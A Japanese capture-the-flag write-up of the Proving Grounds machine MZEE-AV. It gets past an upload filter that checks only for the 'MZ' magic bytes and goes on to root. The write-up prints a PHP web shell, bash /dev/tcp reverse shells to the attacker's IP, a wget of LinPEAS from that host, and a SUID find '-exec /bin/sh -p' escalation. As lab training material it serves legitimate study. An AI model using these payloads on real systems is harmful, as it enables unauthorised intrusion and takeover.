+++
title = "Proving Grounds Practice - MZEE-AV Writeup"
date = "2026-11-27"
description = "MZEE-AVのファイルアップロード機能にあるマジックバイト検証を回避してPHP Web Shellを実行し、SUID/SGIDが設定されたfind互換バイナリを利用してroot権限を取得"
tags = ["Proving Grounds Practice", "CTF", "[Linux]", "[File Upload Bypass]", "[PHP Web Shell]", "[SUID]", "[SGID]", "[GTFOBins Find]"]
categories = ["Proving Grounds Practice"]
toc = true
draft = false
+++

## Machine Info

| Field      | Details        |
| ---------- | -------------- |
| Machine    | MZEE-AV        |
| OS         | Linux (Debian) |
| IP Address | 192.168.129.33 |

---

## Reconnaissance

### Nmap Scan

まず、Nmapを使用して全TCPポートのスキャンとサービスのバージョン確認を行う。

```bash
nmap -sV -sC -p- 192.168.129.33
```

```text
Starting Nmap 7.99 ( https://nmap.org ) at 2026-11-27 19:56 +0900
Nmap scan report for 192.168.129.33
Host is up (0.084s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)
| ssh-hostkey:
|   3072 c9:c3:da:15:28:3b:f1:f8:9a:36:df:4d:36:6b:a7:44 (RSA)
|   256 26:03:2b:f6:da:90:1d:1b:ec:8d:8f:8d:1e:7e:3d:6b (ECDSA)
|_  256 fb:43:b2:b0:19:2f:d3:f6:bc:aa:60:67:ab:c1:af:37 (ED25519)
80/tcp open  http    Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: MZEE-AV - Check your files
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 92.97 seconds
```

スキャン結果から、以下のポートが開放されていることを確認した。

| Port   | Service | Version / Information |
| ------ | ------- | --------------------- |
| 22/tcp | SSH     | OpenSSH 8.4p1 Debian  |
| 80/tcp | HTTP    | Apache httpd 2.4.56   |

80/tcpでWebサービスが動作しているため、Webアプリケーションを調査する。

### Web Enumeration

ブラウザで以下のURLにアクセスする。

```text
http://192.168.129.33/
```

ページには`MZEE-AV - Check your files`と表示されている。

ファイルをアップロードしてチェックする機能があるため、アップロード処理とファイルの取り扱いを調査する。

### Directory Enumeration

Gobusterを使用してディレクトリ列挙を行う。

```bash
gobuster dir -u http://192.168.129.33 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

```text
===============================================================
Gobuster v3.8.2
===============================================================
[+] Url:                     http://192.168.129.33
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
upload               (Status: 301) [Size: 317] [--> http://192.168.129.33/upload/]
backups              (Status: 301) [Size: 318] [--> http://192.168.129.33/backups/]
```

以下の2つのディレクトリが見つかった。

- `/upload/`
- `/backups/`

`/backups/`にアクセスすると、アプリケーションのソースコードを含むファイルを取得できた。

その中に`upload.php`のソースコードが含まれていたため、アップロード時のファイル検証処理を確認する。

### Upload Function Analysis

`upload.php`では、アップロードされたファイルの先頭2バイトを読み取り、マジックバイトを検証している。

該当する処理は以下の通り。

```php
//if ( ! (str_contains($magicbytes, '4D5A'))) {
if ( strpos($magicbytes, '4D5A') === false ) {
```

`4D5A`はASCII文字列の`MZ`に対応する16進数であり、WindowsのPEファイルで使用されるヘッダーである。

この処理では、アップロードされたファイルの先頭に`MZ`が含まれているかを確認している。

つまり、拡張子だけでなくファイルの先頭バイトも検証しているが、検証方法は単純なマジックバイトの確認にとどまっている。

そこで、PHPファイルの先頭に`MZ`を付けることで、この検証を回避する。

---

## Initial Access

### Magic Bytes Validation Bypass

まず、リバースシェルを実行するPHPファイルを作成する。

最初に作成したファイルは以下の通り。

```bash
cat shell.php
```

```php
MZ<?php system("bash -c 'bash -i >& /dev/tcp/192.168.45.183:4444 0>&1'"); ?>
```

先頭に`MZ`を付けることで、アップロード処理のマジックバイト検証を通過させる。

実際にアップロードすると、以下のようにウイルスチェック結果が表示され、アップロードに成功した。

```text
shell.php - MD5: d13ef74d0063a674601509858c0414e0 - seems to be clean!
```

しかし、アップロードした`/upload/shell.php`にアクセスしても、リバースシェルを取得できなかった。

そこで、まずは任意のコマンドを実行できるWeb Shellを作成し、動作確認を行うことにした。

### Create PHP Web Shell

以下の内容で`rev.php`を作成する。

```bash
cat rev.php
```

```php
MZ <?php system($_GET['cmd']); ?>
```

このファイルも先頭に`MZ`を付けているため、アップロード時のマジックバイト検証を通過できる。

作成した`rev.php`をアップロードする。

アップロード後、以下のURLにアクセスしてコマンド実行を確認する。

```text
http://192.168.129.33/upload/rev.php?cmd=ls
```

実行結果は以下の通り。

```text
MZ index.html rev.php shell.php wget.exe whoami.exe
```

`ls`の結果が表示されたことから、PHP Web Shellを通じてコマンドを実行できることが分かった。

### Reverse Shell

Web Shellからリバースシェルを実行する。

攻撃者側のIPアドレスは`192.168.45.183`、待受ポートは`443`を使用する。

まず、Kali側でNetcatのリスナーを起動する。

```bash
nc -lvnp 443
```

次に、ブラウザから以下のURLへアクセスする。

```text
http://192.168.129.33/upload/rev.php?cmd=bash+-c+%27bash+-i+%3E%26+/dev/tcp/192.168.45.183/443+0%3E%261%27
```

URLの`cmd`パラメータで、ターゲットから攻撃者側へ接続するBashコマンドを実行している。

Netcat側に以下の接続が返ってきた。

```text
listening on [any] 443 ...
connect to [192.168.45.183] from (UNKNOWN) [192.168.129.33] 53034
bash: cannot set terminal process group (601): Inappropriate ioctl for device
bash: no job control in this shell
www-data@mzeeav:/var/www/html/upload$
```

これにより、`www-data`ユーザーとして初期アクセスを取得できた。

---

## Privilege Escalation

### Initial Enumeration

初期アクセス後、`/home/avuser`に移動して`local.txt`を確認した。

```bash
cd /home/avuser
cat local.txt
```


### LinPEAS Enumeration

次に、LinPEASをターゲットへ転送して、権限昇格につながる設定やファイルを調査する。

Kali側でHTTPサーバーを起動し、ターゲットからLinPEASをダウンロードする。

```bash
wget http://192.168.45.183:80/linpeas.sh
```

ダウンロードしたスクリプトを実行する。

```bash
./linpeas.sh
```

LinPEASの結果から、通常とは異なるSUID/SGIDファイルが見つかった。

```text
══════════════════════╣ Files with Interesting Permissions ╠══════════════════════                                 
                      ╚════════════════════════════════════╝                                                       
╔══════════╣ SUID - Check easy privesc, exploits and write perms (T1548.001)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid                    
strings Not Found                                                                                                  
strace Not Found                                                                                                   
---s--s--x 1 root root 304K Nov 14  2023 /opt/fileS (Unknown SUID binary!)
```

`/opt/fileS`はroot所有で、SUIDとSGIDの両方が設定されている。

ファイル名からは用途を判断できないため、まずヘルプを表示して機能を確認する。

### Identify /opt/fileS

以下のコマンドを実行する。

```bash
/opt/fileS --help
```

出力は以下の通り。

```text
Usage: /opt/fileS [-H] [-L] [-P] [-Olevel] [-D debugopts] [path...] [expression]

default path is the current directory; default expression is -print
expression may consist of: operators, options, tests, and actions:
operators (decreasing precedence; -and is implicit where no others are given):
     ( EXPR )   ! EXPR   -not EXPR   EXPR1 -a EXPR2   EXPR1 -and EXPR2
     EXPR1 -o EXPR2   EXPR1 -or EXPR2   EXPR1 , EXPR2
positional options (always true): -daystart -follow -regextype
normal options (always true, specified before other expressions):
     -depth --help -maxdepth LEVELS -mindepth LEVELS -mount -noleaf
     --version -xdev -ignore_readdir_race -noignore_readdir_race
tests (N can be +N or -N or N): -amin N -anewer FILE -atime N -cmin N
     -cnewer FILE -ctime N -empty -false -fstype TYPE -gid N -group NAME
     -ilname PATTERN -iname PATTERN -inum N -iwholename PATTERN -iregex PATTERN
     -links N -lname PATTERN -mmin N -mtime N -name PATTERN -newer FILE
     -nouser -nogroup -path PATTERN -perm [-/]MODE -regex PATTERN
     -readable -writable -executable
     -wholename -size N[bcwkMG] -true -type [bcdpflsD] -uid N
     -used N -user NAME -xtype [bcdpfls]      -context CONTEXT

actions: -delete -print0 -printf FORMAT -fprintf FILE FORMAT -print
     -fprint0 FILE -fprint FILE -ls -fls FILE -prune -quit
     -exec COMMAND ; -exec COMMAND {} + -ok COMMAND ;
     -execdir COMMAND ; -execdir COMMAND {} + -okdir COMMAND ;

Valid arguments for -D:
exec, opt, rates, search, stat, time, tree, all, help
Use '-D help' for a description of the options, or see find(1)

Please see also the documentation at http://www.gnu.org/software/findutils/.
You can report (and track progress on fixing) bugs in the "/opt/fileS"
program via the GNU findutils bug-reporting page at
https://savannah.gnu.org/bugs/?group=findutils or, if
you have no web access, by sending email to <bug-findutils@gnu.org>.
```

このヘルプは、Linuxの`find`コマンドのヘルプとほぼ同じ内容である。

さらに、GNU findutilsのドキュメントへのリンクも表示されている。

このことから、`/opt/fileS`は名前を変更した`find`互換バイナリであると判断できる。

### Find - SUID/SGID Privilege Escalation

GTFOBinsで`find`の権限昇格方法を確認する。

参考:

[https://gtfobins.org/gtfobins/find/#shell](https://gtfobins.org/gtfobins/find/#shell)

`find`には、`-exec`オプションを使用して任意のコマンドを実行する機能がある。

今回の`/opt/fileS`はroot所有でSUID/SGIDが設定されているため、この機能を利用してroot権限のシェルを起動できる。

以下のコマンドを実行する。

```bash
/opt/fileS . -exec /bin/sh -p \; -quit
```

各オプションの意味は以下の通り。

| オプション | 説明 |
| ---------- | ---- |
| `.` | 検索対象をカレントディレクトリにする |
| `-exec` | 指定したコマンドを実行する |
| `/bin/sh -p` | 権限を維持した状態でシェルを起動する |
| `\;` | `-exec`のコマンド指定を終了する |
| `-quit` | 検索処理を終了する |

### Root Shell

シェル起動後、現在のユーザーを確認する。

```bash
whoami
```

```text
root
```

root権限の取得に成功した。

---

## Summary

MZEE-AVでは、NmapによるポートスキャンでSSHとHTTPサービスを発見した。

Webアプリケーションのディレクトリ列挙を行い、`/upload/`と`/backups/`を発見した。

`/backups/`から取得したソースコードを調査したところ、アップロード処理ではファイルの先頭2バイトが`MZ`であるかどうかを確認していることが分かった。

そこで、PHPファイルの先頭に`MZ`を付けてアップロードすることで検証を回避した。アップロードしたWeb Shellから任意コマンドを実行し、リバースシェルを通じて`www-data`ユーザーとして初期アクセスを取得した。

特権昇格では、LinPEASによってroot所有のSUID/SGIDバイナリ`/opt/fileS`を発見した。

ヘルプの内容から、このバイナリが`find`互換であると判断した。GTFOBinsに掲載されている`find`の`-exec`を利用し、`/bin/sh -p`を起動することでroot権限を取得した。

**攻撃の流れ**

1. Nmapによる全TCPポートスキャン
2. Gobusterで`/upload/`と`/backups/`を発見
3. `/backups/`から`upload.php`のソースコードを取得
4. `MZ`によるマジックバイト検証を確認
5. PHPファイルの先頭に`MZ`を付けてアップロード制限を回避
6. PHP Web Shellをアップロードしてコマンド実行
7. リバースシェルで`www-data`ユーザーとして初期アクセス
8. LinPEASでSUID/SGIDファイルを調査
9. root所有の`/opt/fileS`を発見
10. ヘルプから`find`互換バイナリであることを特定
11. `-exec`と`/bin/sh -p`を利用してrootシェルを取得

**Initial Access:** PHP Web Shell - Magic Bytes Validation Bypass

**Privilege Escalation:** SUID/SGID `find`-like binary (`/opt/fileS`) - GTFOBins

**Final Access:** root
